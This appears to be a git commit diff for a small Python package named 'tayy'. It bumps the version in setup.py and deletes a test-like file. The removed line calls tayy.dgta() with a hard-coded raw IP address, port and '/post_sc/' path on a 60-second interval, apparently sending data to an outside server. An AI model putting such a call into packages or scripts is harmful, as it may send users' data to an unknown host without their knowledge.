8852678d99efacce37743b49ee66ed741e079fe5
djrong <100102888@qq.com>
2021-01-27 08:58:07 +0800

    djrong

--- setup.py
+++ setup.py
@@ -4,7 +4,7 @@ import setuptools
 
 setuptools.setup(
     name="tayy", # Replace with your own username
-    version="11.0.1",
+    version="11.1.1",
     author="wing",
     author_email="100102888@qq.com",
     description="A small example package",
--- text.py
+++
@@ -1,2 +0,0 @@
-import tayy
-tayy.dgta("http://219.130.112.112:8888/post_sc/", 60)
